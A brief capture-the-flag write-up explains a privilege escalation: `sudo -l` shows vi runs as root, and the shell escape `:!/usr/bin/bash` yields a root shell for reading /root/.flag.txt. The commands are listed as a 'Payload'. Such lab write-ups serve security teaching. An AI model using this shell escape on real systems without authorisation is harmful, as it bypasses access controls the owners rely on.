# Solution

The first thing to note is that the problem as the `vim` tag in it's header. We
are also given information that the flag is somewhere in the `/root` directory.

Running the command `sudo -l` and entering the password given to us reveals our
available permissions as sudo. From there, we see that `/usr/bin/vi` has
elevated privileges when running as sudo.

From here, we can open vi, and run a bash session with `:!/usr/bin/bash`.
Running `whoami` now shows that we are the root user and we can simply `cat`
the flag from there.

## Payload 
```
bash sudo vi 
[Enter Password]
:!/usr/bin/bash
cat /root/.flag.txt
```

Adios
- Lqnk4
